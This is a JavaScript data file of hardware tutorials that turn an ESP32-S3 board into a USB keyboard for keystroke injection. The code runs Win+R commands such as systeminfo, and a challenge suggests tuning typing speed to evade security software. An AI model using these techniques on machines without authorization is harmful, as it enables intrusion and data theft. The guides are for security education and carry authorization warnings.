// ============================================================================
// Signal ESP32-S3 Arsenal — Build Guides (sg-103 through sg-112)
// Native USB security tools on the LILYGO T-Display-S3
// ============================================================================

window.SignalGuides = {

    // ========================================================================
    // SG-103: T-Display-S3 Setup & Your First USB Device
    // ========================================================================
    'sg-103': {
        // Wokwi wave 2: NO SIM — T-Display-S3 unsupported + offensive USB/BLE/RF features not in Wokwi.
        simulator: { available: false, note: 'This build targets the <strong>LILYGO T-Display-S3</strong> (not a board any browser simulator offers) and ends by making it act as a <strong>USB HID device</strong> &mdash; USB gadget emulation isn&#39;t something Wokwi simulates. Read the setup and code here; flash it for real on the S3.' },
        intro: '<p>The ESP32-S3 changes everything. Unlike the standard ESP32, the S3 has <strong>native USB OTG</strong> &mdash; it can present itself as a keyboard, mouse, flash drive, or network adapter to any computer it plugs into. Combined with WiFi and Bluetooth 5, it is a complete security research platform in a device smaller than your thumb.</p>' +
               '<p>In this project you will set up the LILYGO T-Display-S3, configure the development environment, display text on the built-in 1.9" TFT screen, and make the board appear as a USB keyboard that types a message. This is the foundation for every project that follows.</p>' +
               '<p>The T-Display-S3 has a 170x320 ST7789 TFT, two programmable buttons, USB-C with native USB OTG, WiFi, Bluetooth 5 (BLE), and 16MB flash. All for about $18.</p>',

        wiring: '    No external wiring required.\n' +
                '    The T-Display-S3 is an all-in-one board.\n' +
                '    Just connect USB-C to your computer.\n' +
                '\n' +
                '    Board Pinout Reference:\n' +
                '    TFT: ST7789 170x320 (hardwired)\n' +
                '    Buttons: GPIO 0 (BOOT), GPIO 14 (USER)\n' +
                '    USB: Native USB OTG on GPIO 19 (D-) and GPIO 20 (D+)\n' +
                '    Battery: JST 1.25mm connector for LiPo',

        wiringNotes: '<p><strong>No external wiring needed.</strong> The T-Display-S3 is a complete development board. The TFT, buttons, and USB are all integrated on the PCB.</p>' +
                     '<p><strong>USB Mode:</strong> The board has two USB modes: CDC (serial, for programming and debug output) and OTG (for presenting as HID/MSC/network devices). You select the mode in your code.</p>' +
                     '<p><strong>Safety:</strong> When the board is configured as a USB keyboard (HID mode), it will type whatever you program it to. Always test on YOUR OWN machine first. Never deploy on systems you do not own or have written authorization to test.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs><pattern id="sg103-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
            '<rect width="680" height="300" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="660" height="280" fill="url(#sg103-grid)" rx="4"/>' +
            '<text x="340" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-103 T-DISPLAY-S3 OVERVIEW</text>' +
            '<!-- Board outline -->' +
            '<rect x="180" y="50" width="320" height="200" rx="12" fill="#1e2736" stroke="#a855f7" stroke-width="2"/>' +
            '<rect x="180" y="50" width="320" height="28" rx="12" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="340" y="69" text-anchor="middle" fill="#c084fc" font-size="11" font-weight="700">LILYGO T-Display-S3</text>' +
            '<!-- TFT Screen -->' +
            '<rect x="220" y="90" width="100" height="140" rx="6" fill="#0a1628" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<text x="270" y="130" text-anchor="middle" fill="#60a5fa" font-size="8" font-weight="600">ST7789</text>' +
            '<text x="270" y="145" text-anchor="middle" fill="#8b949e" font-size="7">170x320</text>' +
            '<text x="270" y="160" text-anchor="middle" fill="#8b949e" font-size="7">1.9 inch TFT</text>' +
            '<!-- ESP32-S3 chip -->' +
            '<rect x="350" y="100" width="120" height="60" rx="6" fill="rgba(168,85,247,0.1)" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="410" y="125" text-anchor="middle" fill="#c084fc" font-size="8" font-weight="700">ESP32-S3</text>' +
            '<text x="410" y="140" text-anchor="middle" fill="#8b949e" font-size="6">WiFi + BT5 + USB OTG</text>' +
            '<!-- USB-C port -->' +
            '<rect x="315" y="238" width="50" height="14" rx="4" fill="#333" stroke="#8b949e" stroke-width="1"/>' +
            '<text x="340" y="268" text-anchor="middle" fill="#8b949e" font-size="7">USB-C</text>' +
            '<!-- Buttons -->' +
            '<circle cx="200" cy="245" r="8" fill="#1a1f2b" stroke="#22c55e" stroke-width="1.5"/>' +
            '<text x="200" y="268" text-anchor="middle" fill="#22c55e" font-size="6">BOOT</text>' +
            '<circle cx="480" cy="245" r="8" fill="#1a1f2b" stroke="#eab308" stroke-width="1.5"/>' +
            '<text x="480" y="268" text-anchor="middle" fill="#eab308" font-size="6">USER</text>' +
            '<!-- Feature callouts -->' +
            '<rect x="30" y="90" width="130" height="80" rx="6" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.15)" stroke-width="0.5"/>' +
            '<text x="95" y="108" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">KEY FEATURES</text>' +
            '<text x="40" y="124" fill="#8b949e" font-size="7">Native USB OTG</text>' +
            '<text x="40" y="138" fill="#8b949e" font-size="7">WiFi 802.11 b/g/n</text>' +
            '<text x="40" y="152" fill="#8b949e" font-size="7">Bluetooth 5 (BLE)</text>' +
            '<text x="40" y="166" fill="#8b949e" font-size="7">16MB Flash</text>' +
            '<rect x="530" y="90" width="130" height="80" rx="6" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.15)" stroke-width="0.5"/>' +
            '<text x="595" y="108" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">USB MODES</text>' +
            '<text x="540" y="124" fill="#8b949e" font-size="7">CDC: Serial debug</text>' +
            '<text x="540" y="138" fill="#8b949e" font-size="7">HID: Keyboard/Mouse</text>' +
            '<text x="540" y="152" fill="#8b949e" font-size="7">MSC: Flash Drive</text>' +
            '<text x="540" y="166" fill="#8b949e" font-size="7">RNDIS: Network</text>' +
            '</svg></div>',

        steps: [
            {
                title: 'Install PlatformIO and Configure the Board',
                content: '<p>Install PlatformIO as a VS Code extension. Create a new project with board <code>lilygo-t-display-s3</code> and framework <code>arduino</code>. If that board is not listed, use <code>esp32-s3-devkitc-1</code> and configure manually.</p>' +
                         '<p>In <code>platformio.ini</code>, configure for USB OTG support:</p>',
                code: '[env:t-display-s3]\nplatform = espressif32\nboard = lilygo-t-display-s3\nframework = arduino\nmonitor_speed = 115200\nbuild_flags = \n    -DARDUINO_USB_MODE=1\n    -DARDUINO_USB_CDC_ON_BOOT=1\n    -DBOARD_HAS_PSRAM\nlib_deps = \n    bodmer/TFT_eSPI@^2.5.0\n\nupload_speed = 921600',
                language: 'INI',
                tip: '<strong>ARDUINO_USB_MODE=1</strong> enables native USB (OTG mode). Without this flag, the USB port only works as a serial connection through the CH340 chip. This is the single most important build flag for all S3 security projects.'
            },
            {
                title: 'Configure TFT_eSPI for the ST7789 Display',
                content: '<p>The TFT_eSPI library needs a User_Setup.h file configured for the T-Display-S3. Create this file in the library folder or use build flags:</p>',
                code: '// User_Setup.h for LILYGO T-Display-S3\n#define ST7789_DRIVER\n#define TFT_WIDTH  170\n#define TFT_HEIGHT 320\n\n// T-Display-S3 pin assignments\n#define TFT_CS    6\n#define TFT_DC    7\n#define TFT_RST   5\n#define TFT_MOSI  3\n#define TFT_SCLK  2\n#define TFT_BL    38\n\n#define TFT_BACKLIGHT_ON HIGH\n\n// Font includes\n#define LOAD_GLCD\n#define LOAD_FONT2\n#define LOAD_FONT4\n#define LOAD_FONT6\n#define LOAD_FONT7\n#define LOAD_FONT8\n#define LOAD_GFXFF\n#define SMOOTH_FONT\n\n#define SPI_FREQUENCY 40000000',
                language: 'C++',
                tip: '<strong>Pin assignments are specific to the T-Display-S3.</strong> Other ESP32-S3 boards will have different pin mappings. Always check your board schematic.'
            },
            {
                title: 'Hello World on the Display',
                content: '<p>Verify the display works with a simple test. This sketch fills the screen with the Hexworth color scheme and displays text.</p>',
                code: '#include <TFT_eSPI.h>\n\nTFT_eSPI tft = TFT_eSPI();\n\nvoid setup() {\n    Serial.begin(115200);\n    \n    // Initialize display\n    tft.init();\n    tft.setRotation(1);  // Landscape\n    tft.fillScreen(TFT_BLACK);\n    \n    // Turn on backlight\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    \n    // Display boot message\n    tft.setTextColor(0xA55F, TFT_BLACK);  // Purple\n    tft.setTextSize(2);\n    tft.setCursor(20, 40);\n    tft.println("HEXWORTH PRIME");\n    \n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(1);\n    tft.setCursor(20, 80);\n    tft.println("ESP32-S3 Arsenal");\n    tft.println("SG-103: Setup Complete");\n    \n    tft.setTextColor(0x07E0, TFT_BLACK);  // Green\n    tft.setCursor(20, 120);\n    tft.println("Display: OK");\n    tft.println("USB OTG: Ready");\n    tft.println("WiFi: Standby");\n    tft.println("BLE: Standby");\n    \n    Serial.println("SG-103: T-Display-S3 initialized");\n}\n\nvoid loop() {\n    // Nothing yet\n    delay(1000);\n}',
                language: 'C++',
                tip: null
            },
            {
                title: 'Your First USB Keyboard Device',
                content: '<p>Now the critical step &mdash; make the ESP32-S3 appear as a USB keyboard. When plugged into any computer, the host will see a new keyboard device. The board can then send keystrokes as if a human were typing.</p>' +
                         '<p>This uses the ESP32-S3 native USB stack with the TinyUSB HID class.</p>',
                code: '#include <TFT_eSPI.h>\n#include "USB.h"\n#include "USBHIDKeyboard.h"\n\nTFT_eSPI tft = TFT_eSPI();\nUSBHIDKeyboard Keyboard;\n\nconst int BTN_USER = 14;  // User button on T-Display-S3\n\nvoid setup() {\n    Serial.begin(115200);\n    \n    // Initialize display\n    tft.init();\n    tft.setRotation(1);\n    tft.fillScreen(TFT_BLACK);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    \n    // Initialize USB keyboard\n    Keyboard.begin();\n    USB.begin();\n    \n    // Setup button\n    pinMode(BTN_USER, INPUT_PULLUP);\n    \n    // Display status\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(2);\n    tft.setCursor(20, 40);\n    tft.println("USB KEYBOARD");\n    tft.setTextSize(1);\n    tft.setCursor(20, 80);\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.println("Status: ARMED");\n    tft.println("");\n    tft.println("Press USER button to type");\n    tft.println("message on host computer.");\n    tft.println("");\n    tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n    tft.println(">> Test on YOUR machine only");\n}\n\nvoid loop() {\n    if (digitalRead(BTN_USER) == LOW) {\n        // Button pressed - type the message\n        tft.fillRect(20, 140, 280, 20, TFT_BLACK);\n        tft.setTextColor(TFT_RED, TFT_BLACK);\n        tft.setCursor(20, 140);\n        tft.println("TYPING...");\n        \n        delay(500);  // Brief delay for host to be ready\n        \n        Keyboard.println("Hello from ESP32-S3!");\n        Keyboard.println("This was typed by USB HID.");\n        \n        tft.fillRect(20, 140, 280, 20, TFT_BLACK);\n        tft.setTextColor(0x07E0, TFT_BLACK);\n        tft.setCursor(20, 140);\n        tft.println("DONE - message sent");\n        \n        delay(2000);  // Debounce\n    }\n}',
                language: 'C++',
                tip: '<strong>USB.begin()</strong> starts the native USB stack. <strong>Keyboard.begin()</strong> registers the HID keyboard descriptor. The host computer sees a new keyboard device within seconds of plugging in. No drivers needed &mdash; every OS supports USB HID keyboards natively. This is why USB HID injection is such a powerful technique.'
            },
            {
                title: 'Understanding CDC vs HID vs MSC',
                content: '<p>The ESP32-S3 native USB can present as different device classes. Understanding these is critical for the rest of the arsenal:</p>' +
                         '<ul>' +
                         '<li><strong>CDC (Communications Device Class):</strong> Serial port. Used for programming and debug output. The default mode.</li>' +
                         '<li><strong>HID (Human Interface Device):</strong> Keyboard, mouse, gamepad. The host trusts HID devices implicitly &mdash; no driver installation, no prompts. This is what makes USB injection attacks possible.</li>' +
                         '<li><strong>MSC (Mass Storage Class):</strong> Flash drive. The board appears as a removable disk. Combined with HID, you can auto-execute files from the "drive."</li>' +
                         '<li><strong>RNDIS/ECM (Network):</strong> The board appears as a USB network adapter. The host routes traffic through it &mdash; enabling interception.</li>' +
                         '</ul>' +
                         '<p>In the following projects, you will use each of these classes to build a complete security research toolkit.</p>',
                code: null,
                language: null,
                tip: '<strong>Why HID is trusted:</strong> Operating systems assume that USB keyboards and mice are controlled by a human. They do not prompt for permission or require drivers. A USB HID device can send keystrokes at machine speed &mdash; hundreds of characters per second &mdash; executing commands faster than any human could type. This implicit trust is the fundamental vulnerability that USB injection tools exploit.'
            },
            {
                title: 'Button-Controlled Demo with Display Feedback',
                content: '<p>Combine everything: display shows a menu, button triggers the action, USB sends the keystrokes, display confirms completion. This is the pattern for every tool in the arsenal.</p>',
                code: '#include <TFT_eSPI.h>\n#include "USB.h"\n#include "USBHIDKeyboard.h"\n\nTFT_eSPI tft = TFT_eSPI();\nUSBHIDKeyboard Keyboard;\n\nconst int BTN_BOOT = 0;   // Boot button\nconst int BTN_USER = 14;  // User button\n\nint selectedOption = 0;\nconst int NUM_OPTIONS = 3;\nconst char* options[] = {\n    "1. Type Hello",\n    "2. Open Notepad (Win)",\n    "3. System Info"\n};\n\nvoid drawMenu() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(2);\n    tft.setCursor(20, 10);\n    tft.println("S3 ARSENAL");\n    \n    tft.setTextSize(1);\n    for (int i = 0; i < NUM_OPTIONS; i++) {\n        tft.setCursor(20, 50 + i * 20);\n        if (i == selectedOption) {\n            tft.setTextColor(TFT_BLACK, TFT_CYAN);\n        } else {\n            tft.setTextColor(TFT_WHITE, TFT_BLACK);\n        }\n        tft.println(options[i]);\n    }\n    \n    tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n    tft.setCursor(20, 130);\n    tft.println("BOOT=navigate  USER=execute");\n}\n\nvoid executeOption(int opt) {\n    tft.setTextColor(TFT_RED, TFT_BLACK);\n    tft.setCursor(20, 150);\n    tft.println("Executing...");\n    delay(300);\n    \n    switch (opt) {\n        case 0:  // Hello\n            Keyboard.println("Hello from ESP32-S3 Arsenal!");\n            break;\n        case 1:  // Open Notepad\n            Keyboard.press(KEY_LEFT_GUI);\n            Keyboard.press(\'r\');\n            Keyboard.releaseAll();\n            delay(500);\n            Keyboard.println("notepad");\n            delay(500);\n            Keyboard.println("Typed by the ESP32-S3 Arsenal");\n            break;\n        case 2:  // System Info\n            Keyboard.press(KEY_LEFT_GUI);\n            Keyboard.press(\'r\');\n            Keyboard.releaseAll();\n            delay(500);\n            Keyboard.println("cmd /k systeminfo | findstr /B /C:\\"OS Name\\" /C:\\"OS Version\\" /C:\\"System Type\\"");\n            break;\n    }\n    \n    tft.fillRect(20, 150, 280, 15, TFT_BLACK);\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(20, 150);\n    tft.println("Done!");\n}\n\nvoid setup() {\n    Keyboard.begin();\n    USB.begin();\n    \n    tft.init();\n    tft.setRotation(1);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    \n    pinMode(BTN_BOOT, INPUT_PULLUP);\n    pinMode(BTN_USER, INPUT_PULLUP);\n    \n    drawMenu();\n}\n\nvoid loop() {\n    if (digitalRead(BTN_BOOT) == LOW) {\n        selectedOption = (selectedOption + 1) % NUM_OPTIONS;\n        drawMenu();\n        delay(300);\n    }\n    \n    if (digitalRead(BTN_USER) == LOW) {\n        executeOption(selectedOption);\n        delay(1000);\n        drawMenu();\n    }\n}',
                language: 'C++',
                tip: '<strong>This is the skeleton for every tool in the arsenal.</strong> Menu on display, button navigation, action execution. In the following projects, you will replace the simple options with WiFi scanning, BLE tools, and advanced USB payloads.'
            }
        ],

        testing: '<p>Verify each stage:</p>' +
                 '<ul>' +
                 '<li><strong>PlatformIO:</strong> Project compiles without errors. Board is detected on USB.</li>' +
                 '<li><strong>Display:</strong> TFT shows the boot message with correct colors and text alignment.</li>' +
                 '<li><strong>USB HID:</strong> Open a text editor on your computer, press the USER button, and see text appear as if typed by a keyboard.</li>' +
                 '<li><strong>Menu system:</strong> BOOT button cycles through options, USER button executes the selected option.</li>' +
                 '<li><strong>Device Manager:</strong> Your computer should show a new "HID Keyboard Device" when the board is plugged in.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Board not detected by PlatformIO:</strong> Hold the BOOT button while plugging in USB-C. This forces the S3 into download mode. Release after plugging in.</li>' +
                         '<li><strong>Display is blank:</strong> Check TFT_BL pin (38) is set HIGH. Verify TFT_eSPI User_Setup.h pin assignments match the T-Display-S3.</li>' +
                         '<li><strong>USB HID not working:</strong> Make sure <code>ARDUINO_USB_MODE=1</code> is in your build flags. Without this, the USB port runs as CDC serial only.</li>' +
                         '<li><strong>"USB Device Not Recognized" on host:</strong> The TinyUSB stack may not have initialized properly. Add a <code>delay(2000)</code> at the start of setup() to give the USB stack time to enumerate.</li>' +
                         '<li><strong>Keyboard types wrong characters:</strong> USB HID uses US keyboard layout by default. If your host uses a different layout, some characters may map incorrectly.</li>' +
                         '<li><strong>Cannot upload after USB HID code:</strong> The native USB takes over from CDC. Hold BOOT button while resetting to re-enter download mode.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: OS Detection</strong> &mdash; Before typing, detect which operating system the host is running (check USB descriptors or timing behavior) and adjust keyboard shortcuts accordingly (Win+R for Windows, Cmd+Space for macOS, Ctrl+Alt+T for Linux).</p>' +
                    '<p><strong>Challenge 2: Payload File System</strong> &mdash; Store multiple payload scripts on SPIFFS (the S3 flash filesystem). The display shows a file browser, and you select which payload to execute. Add the ability to create new payloads over WiFi.</p>' +
                    '<p><strong>Challenge 3: Stealth Timing</strong> &mdash; Instead of typing at machine speed, add randomized delays between keystrokes to mimic human typing patterns. Measure how fast different typing speeds are before triggering security software alerts.</p>',

        stepVisuals: {
            3: '<svg viewBox="0 0 680 120" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace;display:block;width:100%">' +
               '<rect width="680" height="120" fill="#0d1117" rx="6"/>' +
               '<text x="340" y="18" text-anchor="middle" fill="#444" font-size="8" font-weight="700" letter-spacing="0.15em">USB DEVICE CLASS COMPARISON</text>' +
               '<rect x="20" y="30" width="150" height="75" rx="4" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="1"/>' +
               '<text x="95" y="48" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="700">CDC (Serial)</text>' +
               '<text x="95" y="64" text-anchor="middle" fill="#8b949e" font-size="6.5">Debug output</text>' +
               '<text x="95" y="78" text-anchor="middle" fill="#8b949e" font-size="6.5">Programming</text>' +
               '<text x="95" y="92" text-anchor="middle" fill="#555" font-size="6">Default mode</text>' +
               '<rect x="185" y="30" width="150" height="75" rx="4" fill="rgba(239,68,68,0.08)" stroke="rgba(239,68,68,0.3)" stroke-width="1"/>' +
               '<text x="260" y="48" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="700">HID (Keyboard)</text>' +
               '<text x="260" y="64" text-anchor="middle" fill="#8b949e" font-size="6.5">Keystroke injection</text>' +
               '<text x="260" y="78" text-anchor="middle" fill="#8b949e" font-size="6.5">No driver needed</text>' +
               '<text x="260" y="92" text-anchor="middle" fill="#555" font-size="6">Implicitly trusted</text>' +
               '<rect x="350" y="30" width="150" height="75" rx="4" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="1"/>' +
               '<text x="425" y="48" text-anchor="middle" fill="#3b82f6" font-size="8" font-weight="700">MSC (Storage)</text>' +
               '<text x="425" y="64" text-anchor="middle" fill="#8b949e" font-size="6.5">Flash drive emulation</text>' +
               '<text x="425" y="78" text-anchor="middle" fill="#8b949e" font-size="6.5">File delivery</text>' +
               '<text x="425" y="92" text-anchor="middle" fill="#555" font-size="6">Auto-run risk</text>' +
               '<rect x="515" y="30" width="150" height="75" rx="4" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.3)" stroke-width="1"/>' +
               '<text x="590" y="48" text-anchor="middle" fill="#a855f7" font-size="8" font-weight="700">RNDIS (Network)</text>' +
               '<text x="590" y="64" text-anchor="middle" fill="#8b949e" font-size="6.5">Network adapter</text>' +
               '<text x="590" y="78" text-anchor="middle" fill="#8b949e" font-size="6.5">Traffic intercept</text>' +
               '<text x="590" y="92" text-anchor="middle" fill="#555" font-size="6">MITM capable</text>' +
               '</svg>'
        },

        componentCallouts: {
            svg: '<svg viewBox="0 0 560 180" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace;display:block;width:100%">' +
                 '<rect width="560" height="180" fill="#0d1117" rx="6"/>' +
                 '<text x="280" y="18" text-anchor="middle" fill="#444" font-size="8" font-weight="700" letter-spacing="0.14em">SG-103 COMPONENTS</text>' +
                 '<rect x="20" y="30" width="240" height="60" rx="6" fill="#0f1a2e" stroke="#a855f7" stroke-width="1.5"/>' +
                 '<text x="140" y="52" text-anchor="middle" fill="#c084fc" font-size="8" font-weight="700">LILYGO T-Display-S3</text>' +
                 '<text x="140" y="68" text-anchor="middle" fill="#8b949e" font-size="6.5">ESP32-S3 + 1.9" TFT + USB OTG</text>' +
                 '<text x="140" y="82" text-anchor="middle" fill="#555" font-size="6">$18 | All-in-one board</text>' +
                 '<rect x="300" y="30" width="240" height="60" rx="6" fill="#0f1a2e" stroke="#3b82f6" stroke-width="1.5"/>' +
                 '<text x="420" y="52" text-anchor="middle" fill="#60a5fa" font-size="8" font-weight="700">USB-C Cable</text>' +
                 '<text x="420" y="68" text-anchor="middle" fill="#8b949e" font-size="6.5">Data cable (not charge-only)</text>' +
                 '<text x="420" y="82" text-anchor="middle" fill="#555" font-size="6">Must support USB 2.0 data</text>' +
                 '</svg>',
            components: [
                {
                    id: 't-display-s3',
                    name: 'LILYGO T-Display-S3',
                    purpose: 'ESP32-S3 development board with integrated 1.9 inch ST7789 TFT display (170x320), two programmable buttons, USB-C with native USB OTG, WiFi 802.11 b/g/n, Bluetooth 5 (BLE), 16MB flash, and optional LiPo battery connector. The native USB OTG is the key differentiator from standard ESP32 boards.',
                    specs: ['ESP32-S3 dual-core 240MHz', '16MB Flash, 8MB PSRAM', 'ST7789 170x320 TFT', 'USB OTG (GPIO 19/20)', 'WiFi + BT5', '~$18']
                },
                {
                    id: 'usb-cable',
                    name: 'USB-C Data Cable',
                    purpose: 'Connects the T-Display-S3 to your computer for programming and USB device emulation. Must be a data cable, not a charge-only cable. Charge-only cables have no data wires and will not work for programming or USB HID.',
                    specs: ['USB 2.0 data support', 'USB-C connector', 'Not charge-only']
                }
            ]
        },

        commonMistakes: [
            {
                title: 'Using a Charge-Only USB-C Cable',
                correct: 'Use a USB-C cable that supports data transfer. Data cables are slightly thicker and have 4 wires inside (2 power + 2 data). Test by checking if the board appears as a serial device in Device Manager.',
                incorrect: 'Using the thin USB-C cable that came with a phone charger. Many cheap cables only carry power (2 wires) and cannot transfer data.',
                consequence: 'The board gets power (LED lights up) but is invisible to PlatformIO and cannot be programmed. You spend hours troubleshooting drivers when the cable is the problem.'
            },
            {
                title: 'Missing ARDUINO_USB_MODE Build Flag',
                correct: 'Include <code>-DARDUINO_USB_MODE=1</code> in your platformio.ini build_flags. This enables the native USB OTG stack on the ESP32-S3.',
                incorrect: 'Compiling without the USB mode flag. The default mode uses the USB port only for CDC serial through the onboard USB-serial converter.',
                consequence: 'The code compiles and uploads, but <code>USB.begin()</code> and <code>Keyboard.begin()</code> silently fail. The board never appears as a HID device on the host. No error message is shown.'
            },
            {
                title: 'Testing USB HID Payloads on the Wrong Machine',
                correct: 'Always test on YOUR OWN computer first. Open a text editor and verify the keystrokes appear correctly before demonstrating. Keep payloads simple and reversible during development.',
                incorrect: 'Plugging the board into a lab computer, classroom machine, or any system you do not have explicit authorization to test on.',
                consequence: 'The board types commands immediately on plug-in. If the payload opens a terminal and runs commands, you have just executed unauthorized actions on someone else\'s machine. This can result in disciplinary action, legal consequences, or damage to systems.'
            }
        ]
    },

    // ========================================================================
    // SG-104: USB Keystroke Injection — Advanced Payloads
    // ========================================================================
    'sg-104': {
        // Wokwi wave 2: NO SIM — T-Display-S3 unsupported + offensive USB/BLE/RF features not in Wokwi.
        simulator: { available: false, note: 'Keystroke injection is <strong>USB HID</strong> emulation &mdash; the board pretends to be a keyboard to the host. No browser simulator can present a USB HID device to your real OS, so this one needs the physical T-Display-S3. The code and payload logic on this page are the whole lesson; run it on hardware.' },
        intro: '<p>In SG-103 you made the ESP32-S3 type a simple message. Now you will build a full keystroke injection framework &mdash; a DuckyScript-compatible payload engine that reads scripts from the flash filesystem, displays a selection menu on the TFT, and executes multi-step command sequences on the target machine.</p>' +
               '<p>This is how professional USB security assessment tools work. Understanding the technique is essential for building detection systems that protect against it.</p>' +
               '<p>You will create three safe demonstration payloads: a system information collector, a text file creator, and a WiFi password extractor (displays saved WiFi passwords on Windows). All payloads are educational and reversible.</p>',

        wiring: '    No external wiring required.\n    Same T-Display-S3 board from SG-103.\n    USB-C connection to target machine.',

        wiringNotes: '<p><strong>No external wiring.</strong> Same board as SG-103.</p>' +
                     '<p><strong>Authorization:</strong> USB keystroke injection is a penetration testing technique. Only use on systems you own or have explicit written permission to test. Unauthorized use may violate computer fraud laws.</p>' +
                     '<p><strong>Safety:</strong> Always review your payload before execution. A typo in a command sequence could delete files, change settings, or lock accounts. Test on a virtual machine first.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs><pattern id="sg104-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
            '<rect width="680" height="200" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="660" height="180" fill="url(#sg104-grid)" rx="4"/>' +
            '<text x="340" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-104 USB KEYSTROKE INJECTION FLOW</text>' +
            '<!-- S3 Board -->' +
            '<rect x="40" y="60" width="160" height="100" rx="8" fill="#1e2736" stroke="#a855f7" stroke-width="1.5"/>' +
            '<text x="120" y="85" text-anchor="middle" fill="#c084fc" font-size="9" font-weight="700">T-Display-S3</text>' +
            '<text x="120" y="100" text-anchor="middle" fill="#8b949e" font-size="7">Payload stored</text>' +
            '<text x="120" y="114" text-anchor="middle" fill="#8b949e" font-size="7">in SPIFFS flash</text>' +
            '<rect x="60" y="125" width="120" height="20" rx="3" fill="rgba(239,68,68,0.1)" stroke="#ef4444" stroke-width="0.5"/>' +
            '<text x="120" y="139" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">SELECT PAYLOAD</text>' +
            '<!-- Arrow -->' +
            '<line x1="210" y1="110" x2="300" y2="110" stroke="#eab308" stroke-width="2"/>' +
            '<polygon points="295,106 305,110 295,114" fill="#eab308"/>' +
            '<text x="255" y="100" text-anchor="middle" fill="#eab308" font-size="7">USB HID</text>' +
            '<text x="255" y="125" text-anchor="middle" fill="#555" font-size="6">Keystrokes at</text>' +
            '<text x="255" y="135" text-anchor="middle" fill="#555" font-size="6">machine speed</text>' +
            '<!-- Target -->' +
            '<rect x="310" y="60" width="160" height="100" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<text x="390" y="85" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="700">TARGET PC</text>' +
            '<text x="390" y="100" text-anchor="middle" fill="#8b949e" font-size="7">Sees a USB keyboard</text>' +
            '<text x="390" y="114" text-anchor="middle" fill="#8b949e" font-size="7">Trusts input implicitly</text>' +
            '<text x="390" y="132" text-anchor="middle" fill="#ef4444" font-size="7">Commands execute as</text>' +
            '<text x="390" y="146" text-anchor="middle" fill="#ef4444" font-size="7">logged-in user</text>' +
            '<!-- Defense box -->' +
            '<rect x="500" y="60" width="160" height="100" rx="8" fill="rgba(34,197,94,0.06)" stroke="#22c55e" stroke-width="1.5"/>' +
            '<text x="580" y="85" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="700">DEFENSE</text>' +
            '<text x="580" y="104" text-anchor="middle" fill="#8b949e" font-size="6.5">USB device policies</text>' +
            '<text x="580" y="118" text-anchor="middle" fill="#8b949e" font-size="6.5">HID keystroke timing</text>' +
            '<text x="580" y="132" text-anchor="middle" fill="#8b949e" font-size="6.5">USB port lockdown</text>' +
            '<text x="580" y="146" text-anchor="middle" fill="#8b949e" font-size="6.5">Endpoint detection</text>' +
            '</svg></div>',

        steps: [
            {
                title: 'Build the Payload Engine',
                content: '<p>Create a DuckyScript-compatible parser that reads payload files from SPIFFS (the ESP32-S3 flash filesystem). Each payload is a text file with simple commands: STRING (type text), DELAY (wait), GUI (Windows key), ENTER, etc.</p>',
